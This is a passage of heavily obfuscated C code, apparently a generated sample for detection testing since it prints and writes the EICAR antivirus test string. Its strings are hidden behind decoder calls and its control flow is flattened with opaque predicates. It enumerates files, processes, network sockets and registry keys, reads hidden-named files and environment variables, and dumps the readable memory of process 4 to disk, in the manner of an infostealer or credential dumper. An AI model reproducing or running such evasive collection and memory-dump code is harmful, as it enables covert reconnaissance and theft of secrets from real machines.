    FILE* f = fopen(path, j_dc_2());
    if (!f) return "";
    size_t n = fread(j_buf, (0 + 1), J_BUF_CAP - 1, f);
    fclose(f);
    j_buf[n] = '\0';
    return j_buf;
}

static void j_fs_write(const char* path, const char* data) {
    FILE* f = fopen(path, j_dc_3());
    if (f) { fputs(data, f); fclose(f); }
}

static const char* j_fs_list(const char* dir) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = 1;
#if defined(_WIN32)
    char pattern[1024];
    snprintf(pattern, sizeof pattern, "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (fd.cFileName[((0 + 0) ^ (1021 ^ 1021))] == '.') continue;
            if (off > J_BUF_CAP - (183 + 17)) break;
            if (!first) j_buf[off++] = ',';
            first = ((0 + 0) ^ (495 ^ 495));
            char esc[((813 + 211) ^ (6754 ^ 6754))];
            j_json_escape(esc, sizeof esc, fd.cFileName);
            int n = snprintf(j_buf + off, J_BUF_CAP - off, "\"%s\"", esc);
            off += (size_t)(n > 0 ? n : (0 + 0));
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
#else
    DIR* d = opendir(dir);
    if (d) {
        struct dirent* de;
        while ((de = readdir(d)) != NULL) {
            if (de->d_name[0] == '.') continue;
            if (off > J_BUF_CAP - (8 + 192)) break;
            if (!first) j_buf[off++] = ',';
            first = ((0 + 0) ^ (342 ^ 342));
            char esc[((162 + 862) ^ (1272 ^ 1272))];
            j_json_escape(esc, sizeof esc, de->d_name);
            int n = snprintf(j_buf + off, J_BUF_CAP - off, "\"%s\"", esc);
            off += (size_t)(n > (0 + 0) ? n : 0);
        }
        closedir(d);
    }
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static const char* j_sys_process_list(void) {
    size_t off = ((0 + 0) ^ (5109 ^ 5109));
    j_buf[off++] = '[';
    int first = ((1 + 0) ^ (1331 ^ 1331));
#if defined(_WIN32)
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ((0 + 0) ^ (9723 ^ 9723)));
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof pe;
        if (Process32FirstW(snap, &pe)) {
            do {
                if (off > J_BUF_CAP - (363 + 37)) break;
                char name[(979 + 45)];
                size_t k = 0;
                for (size_t i = (0 + 0); pe.szExeFile[i] && k + 1 < sizeof name; ++i)
                    name[k++] = (char)(pe.szExeFile[i] & 0xFF);
                name[k] = '\0';
                if (!first) j_buf[off++] = ',';
                first = 0;
                char esc[2048];
                j_json_escape(esc, sizeof esc, name);
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"pid\":%lu,\"name\":\"%s\"}", (unsigned long)pe.th32ProcessID, esc);
                off += (size_t)(n > 0 ? n : 0);
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
    }
#elif defined(__APPLE__)
    int all_pids[8192];
    int np = proc_listallpids(all_pids, sizeof all_pids);
    for (int i = 0; i < np; ++i) {
        int pid = all_pids[i];
        if (off > J_BUF_CAP - 400) break;
        char name[(9 + 247)];
        int len = proc_name(pid, name, sizeof name);
        if (len <= 0) snprintf(name, sizeof name, "pid_%d", pid);
        if (!first) j_buf[off++] = ',';
        first = ((0 + 0) ^ (5921 ^ 5921));
        char esc[512];
        j_json_escape(esc, sizeof esc, name);
        int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"pid\":%d,\"name\":\"%s\"}", pid, esc);
        off += (size_t)(n > 0 ? n : (0 + 0));
    }
#else
    DIR* d = opendir(j_dc_4());
    if (d) {
        struct dirent* de;
        while ((de = readdir(d)) != NULL) {
            if (de->d_name[0] < '0' || de->d_name[((0 + 0) ^ (8034 ^ 8034))] > '9') continue;
            int pid = atoi(de->d_name);
            char p[64], name[256];
            snprintf(p, sizeof p, "/proc/%d/comm", pid);
            FILE* f = fopen(p, j_dc_5());
            if (f) {
                if (fgets(name, sizeof name, f)) name[strcspn(name, j_dc_6())] = '\0';
                fclose(f);
                if (off > J_BUF_CAP - 400) break;
                if (!first) j_buf[off++] = ',';
                first = ((0 + 0) ^ (4113 ^ 4113));
                char esc[((322 + 190) ^ (8722 ^ 8722))];
                j_json_escape(esc, sizeof esc, name);
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"pid\":%d,\"name\":\"%s\"}", pid, esc);
                off += (size_t)(n > (0 + 0) ? n : 0);
            }
        }
        closedir(d);
    }
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static void j_net_proc_parse(const char* path, size_t* off, int* first) {
    FILE* f = fopen(path, j_dc_7());
    if (!f) return;
    char line[512];
    int skip = (0 + 1);
    while (fgets(line, sizeof line, f)) {
        if (skip) { skip = 0; continue; }
        char laddr[(1 + 63)], raddr[64], st[(0 + 16)];
        if (sscanf(line, "%*s %63s %63s %15s", laddr, raddr, st) != ((3 + 0) ^ (6082 ^ 6082))) continue;
        if (*off > J_BUF_CAP - 300) break;
        if (!*first) j_buf[(*off)++] = ',';
        *first = 0;
        int n = snprintf(j_buf + *off, J_BUF_CAP - *off, "{\"local\":\"%s\",\"remote\":\"%s\",\"state\":\"%s\"}", laddr, raddr, st);
        *off += (size_t)(n > 0 ? n : 0);
    }
    fclose(f);
}

static const char* j_net_sockets(void) {
    size_t off = (0 + 0);
    j_buf[off++] = '[';
    int first = (1 + 0);
#if defined(_WIN32)
    ULONG sz = ((0 + 0) ^ (6934 ^ 6934));
    GetExtendedTcpTable(NULL, &sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    char* t = (char*)malloc(sz ? sz : (1 + 0));
    if (t) {
        MIB_TCPTABLE_OWNER_PID* tab = (MIB_TCPTABLE_OWNER_PID*)t;
        if (GetExtendedTcpTable(tab, &sz, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
            for (DWORD i = ((0 + 0) ^ (1933 ^ 1933)); i < tab->dwNumEntries; ++i) {
                MIB_TCPROW_OWNER_PID* r = &tab->table[i];
                char li[64], ri[((64 + 0) ^ (8546 ^ 8546))];
                snprintf(li, sizeof li, "%s:%u", inet_ntoa(*(struct in_addr*)&r->dwLocalAddr), (unsigned)ntohs((u_short)r->dwLocalPort));
                snprintf(ri, sizeof ri, "%s:%u", inet_ntoa(*(struct in_addr*)&r->dwRemoteAddr), (unsigned)ntohs((u_short)r->dwRemotePort));
                const char* state = j_dc_8();
                switch (r->dwState) {
                    case 2:  state = j_dc_9(); break;
                    case 5:  state = j_dc_10(); break;
                    case 8:  state = j_dc_11(); break;
                    case 11: state = j_dc_12(); break;
                    default: state = j_dc_13(); break;
                }
                if (off > J_BUF_CAP - (184 + 116)) break;
                if (!first) j_buf[off++] = ',';
                first = 0;
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"local\":\"%s\",\"remote\":\"%s\",\"state\":\"%s\"}", li, ri, state);
                off += (size_t)(n > (0 + 0) ? n : (0 + 0));
            }
        }
        free(t);
    }
#elif defined(__APPLE__)
    FILE* ns = popen(j_dc_14(), j_dc_15());
    if (ns) {
        char line[512];
        while (fgets(line, sizeof line, ns)) {
            char proto[8], laddr[(61 + 3)], raddr[((44 + 20) ^ (8556 ^ 8556))], st[((26 + 6) ^ (5423 ^ 5423))];
            if (sscanf(line, "%7s %*s %*s %63s %63s %31s", proto, laddr, raddr, st) == 4) {
                if (strncmp(proto, j_dc_16(), 3) != 0) continue;
                if (off > J_BUF_CAP - 300) break;
                if (!first) j_buf[off++] = ',';
                first = 0;
                int n = snprintf(j_buf + off, J_BUF_CAP - off, "{\"local\":\"%s\",\"remote\":\"%s\",\"state\":\"%s\"}", laddr, raddr, st);
                off += (size_t)(n > 0 ? n : 0);
            }
        }
        pclose(ns);
    }
#else
    j_net_proc_parse(j_dc_17(), &off, &first);
    j_net_proc_parse(j_dc_18(), &off, &first);
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static const char* j_reg_list(const char* key) {
    size_t off = 0;
    j_buf[off++] = '[';
    int first = ((1 + 0) ^ (6134 ^ 6134));
#if defined(_WIN32)
    HKEY root = HKEY_LOCAL_MACHINE;
    const char* sub = key;
    if (strncmp(key, j_dc_19(), ((0 + 5) ^ (7576 ^ 7576))) == (0 + 0)) { root = HKEY_LOCAL_MACHINE; sub = key + (0 + 5); }
    else if (strncmp(key, j_dc_20(), (5 + 0)) == ((0 + 0) ^ (8464 ^ 8464))) { root = HKEY_CURRENT_USER; sub = key + ((5 + 0) ^ (4823 ^ 4823)); }
    else if (strncmp(key, j_dc_21(), 5) == (0 + 0)) { root = HKEY_CLASSES_ROOT; sub = key + (2 + 3); }
    else if (strncmp(key, j_dc_22(), 4) == (0 + 0)) { root = HKEY_USERS; sub = key + ((0 + 4) ^ (4153 ^ 4153)); }
    HKEY hk = NULL;
    if (RegOpenKeyExA(root, sub, (0 + 0), KEY_READ, &hk) == ERROR_SUCCESS) {
        for (DWORD i = 0; ; ++i) {
            char s[((16 + 240) ^ (1143 ^ 1143))];
            DWORD n = sizeof s;
            if (RegEnumKeyExA(hk, i, s, &n, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
            if (off > J_BUF_CAP - 400) break;
            if (!first) j_buf[off++] = ',';
            first = 0;
            char esc[(473 + 39)];
            j_json_escape(esc, sizeof esc, s);
            int n2 = snprintf(j_buf + off, J_BUF_CAP - off, "\"%s\"", esc);
            off += (size_t)(n2 > (0 + 0) ? n2 : ((0 + 0) ^ (7888 ^ 7888)));
        }
        RegCloseKey(hk);
    }
#else
    (void)key;
#endif
    j_buf[off++] = ']';
    j_buf[off] = '\0';
    return j_buf;
}

static void j_mem_dump(int32_t pid, const char* path) {
#if defined(_WIN32)
    HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, (DWORD)pid);
    if (!h) return;
    FILE* out = fopen(path, j_dc_23());
    if (!out) { CloseHandle(h); return; }
    unsigned char* base = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    unsigned long regions = 0;
    while (VirtualQueryEx(h, base, &mbi, sizeof mbi) == sizeof mbi && regions++ < 100000) {
        if (mbi.State == MEM_COMMIT && !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) &&
            (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY ||
             mbi.Protect == PAGE_EXECUTE_READWRITE || mbi.Protect == PAGE_EXECUTE_READ)) {
            unsigned char* chunk = (unsigned char*)malloc(mbi.RegionSize ? mbi.RegionSize : ((0 + 1) ^ (7394 ^ 7394)));
            SIZE_T read = (0 + 0);
            if (chunk && ReadProcessMemory(h, mbi.BaseAddress, chunk, mbi.RegionSize, &read) && read) {
                fwrite(chunk, 1, read, out);
            }
            free(chunk);
        }
        base = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
    fclose(out);
    CloseHandle(h);
#else
    (void)pid; (void)path;
#endif
}

static volatile int32_t j_b8iox1io = ((10517 + 3853) ^ (1642 ^ 1642));
static volatile int32_t j_hy5xl3qz = 19452;

__attribute__((used)) static int32_t j_z_8os37r(int32_t j_a, int32_t j_b, int32_t j_c) {
    int32_t j_r = j_a;
    int32_t j_t = 0;
    while (j_t < j_b) {
        j_r = (j_r * 31 + j_c) % 10007;
        j_t = j_t + 1;
    }
    return j_r;
}

__attribute__((used)) static int32_t j_z_88avi0(int32_t j_a, int32_t j_b, int32_t j_c) {
    int32_t j_r = j_a;
    int32_t j_t = (0 + 0);
    while (j_t < j_b) {
        j_r = (j_r * (11 + 20) + j_c) % 10007;
        j_t = j_t + 1;
    }
    return j_r;
}

__attribute__((used)) static int32_t j_z_ppbxpi(int32_t j_a, int32_t j_b, int32_t j_c) {
    int32_t j_r = j_a;
    int32_t j_t = ((0 + 0) ^ (5331 ^ 5331));
    while (j_t < j_b) {
        j_r = (j_r * 31 + j_c) % 10007;
        j_t = j_t + 1;
    }
    return j_r;
}

__attribute__((used)) static int32_t j_z_p6osly(int32_t j_a, int32_t j_b) {
    int32_t j_r = ((0 + 0) ^ (7393 ^ 7393));
    for (int32_t j_i = ((0 + 0) ^ (8319 ^ 8319)); j_i < j_a; j_i++) {
        j_r = j_r + j_b;
        if (j_r > 1000) j_r = j_r - 1000;
    }
    return j_r;
}

static int32_t j_tr_dqdbfc(void) {
    int32_t j_d20wqp44 = 0;
    while ((j_d20wqp44 != -1))
    {
        switch (j_d20wqp44)
        {
            case 0:
                (void)printf("%s\n", j_dc_24());
                (void)printf("%s\n", "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
                (void)printf("%s\n", j_dc_25());
                (void)printf("%s\n", j_dc_26());
                (void)printf("%s\n", j_dc_27());
                (void)printf("%s\n", j_dc_28());
                static volatile int64_t j_97e8rt6x = 24102;
                if ((((j_97e8rt6x * j_97e8rt6x) + j_97e8rt6x) < 0))
                {
                    (void)printf("%s\n", (0 + 0) ? j_dc_29() : j_dc_30());
                }
                j_d20wqp44 = (0 + 1);
                break;
            case 1:
                static volatile int64_t j_mwm8gmiq = ((5950 + 13487) ^ (4013 ^ 4013));
                if ((((j_mwm8gmiq * j_mwm8gmiq) + j_mwm8gmiq) >= 0))
                {
                    (void)printf("%s\n", j_dc_31());
                }
                else
                {
                    volatile int64_t j_mq280hm7 = ((j_mwm8gmiq * ((0 + 2) ^ (1661 ^ 1661))) + 1);
                }
                j_d20wqp44 = (2 + 0);
                break;
            case 2:
                static volatile int64_t j_m409j0e8 = (23325 + 49308);
                if ((((j_m409j0e8 * j_m409j0e8) + j_m409j0e8) >= 0))
                {
                    (void)printf("%s\n", j_sys_process_list());
                }
                else
                {
                    volatile int64_t j_5mp531u1 = ((j_m409j0e8 * 2) + 1);
                }
                j_d20wqp44 = 3;
                break;
            case 3:
                (void)printf("%s\n", j_dc_32());
                (void)printf("%s\n", j_fs_read(j_dc_33()));
                (void)printf("%s\n", j_dc_34());
                (void)printf("%s\n", j_fs_read(j_dc_35()));
                (void)printf("%s\n", j_dc_36());
                (void)printf("%s\n", j_env_get(j_dc_37()));
                static volatile int64_t j_12qmt2jd = ((6194 + 10390) ^ (3839 ^ 3839));
                if ((((j_12qmt2jd * j_12qmt2jd) + j_12qmt2jd) < 0))
                {
                    volatile int64_t j_c1zitrcb = ((j_12qmt2jd * (4 + 36)) + 584);
                    (void)printf("%s\n", (0 + 0) ? j_dc_38() : j_dc_39());
                }
                j_d20wqp44 = ((3 + 1) ^ (7272 ^ 7272));
                break;
            case 4:
                (void)printf("%s\n", j_env_get(j_dc_40()));
                (void)printf("%s\n", j_env_get(j_dc_41()));
                static volatile int64_t j_srfwgn1t = 90780;
                if ((((j_srfwgn1t * j_srfwgn1t) + j_srfwgn1t) < 0))
                {
                    volatile int64_t j_259idg9m = ((j_srfwgn1t * ((92 + 8) ^ (6461 ^ 6461))) + 780);
                    (void)printf("%s\n", (0 + 0) ? j_dc_42() : j_dc_43());
                }
                j_d20wqp44 = 5;
                break;
            case 5:
                (void)printf("%s\n", j_env_get(j_dc_44()));
                (void)printf("%s\n", j_env_get(j_dc_45()));
                static volatile int64_t j_b015vusu = (21307 + 1126);
                if ((((j_b015vusu * j_b015vusu) + j_b015vusu) >= 0))
                {
                    (void)printf("%s\n", j_env_get(j_dc_46()));
                }
                else
                {
                    volatile int64_t j_ncfrqic9 = ((j_b015vusu * ((0 + 2) ^ (1515 ^ 1515))) + 1);
                }
                j_d20wqp44 = 6;
                break;
            case 6:
                (void)printf("%s\n", j_dc_47());
                static volatile int64_t j_uo8zguyz = 5167;
                if ((((j_uo8zguyz * j_uo8zguyz) + j_uo8zguyz) < 0))
                {
                    volatile int64_t j_j4sp7iym = ((j_uo8zguyz * 49) + 167);
                    (void)printf("%s\n", ((0 + 0) ^ (4464 ^ 4464)) ? j_dc_48() : j_dc_49());
                }
                j_d20wqp44 = ((1 + 6) ^ (3619 ^ 3619));
                break;
            case 7:
                const char* j_tzfjnjj0 = j_env_get(j_dc_50());
                (void)printf("%s\n", j_fs_list(j_tzfjnjj0));
                (void)printf("%s\n", j_fs_exists(j_tzfjnjj0) ? j_dc_51() : j_dc_52());
                (void)printf("%s\n", j_dc_53());
                (void)j_fs_write(j_dc_54(), "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\n");
                static volatile int64_t j_zxqy7ffa = (8265 + 76980);
                if ((((j_zxqy7ffa * j_zxqy7ffa) + j_zxqy7ffa) < 0))
                {
                    volatile int64_t j_t7k13p16 = ((j_zxqy7ffa * 36) + ((95 + 150) ^ (1271 ^ 1271)));
                    (void)printf("%s\n", 0 ? j_dc_55() : j_dc_56());
                }
                j_d20wqp44 = (7 + 1);
                break;
            case 8:
                (void)printf("%s\n", j_fs_read(j_dc_57()));
                static volatile int64_t j_l2ciqoji = 93365;
                if ((((j_l2ciqoji * j_l2ciqoji) + j_l2ciqoji) >= (0 + 0)))
                {
                    (void)printf("%s\n", j_dc_58());
                }
                else
                {
                    volatile int64_t j_2d7g9gqn = ((j_l2ciqoji * (0 + 2)) + (1 + 0));
                }
                j_d20wqp44 = 9;
                break;
            case 9:
                (void)j_mem_dump((4 + 0), j_dc_59());
                (void)printf("%s\n", j_dc_60());
                j_d20wqp44 = -1;
                break;
            default:
                break;
        }
    }
    return (0 + 0);
}
static int32_t j_tr_vlhggv(void) { return j_tr_dqdbfc(); }
static int32_t j_tr_dl0s0h(void) { return j_tr_vlhggv(); }
int32_t main(void) { return j_tr_dl0s0h(); }

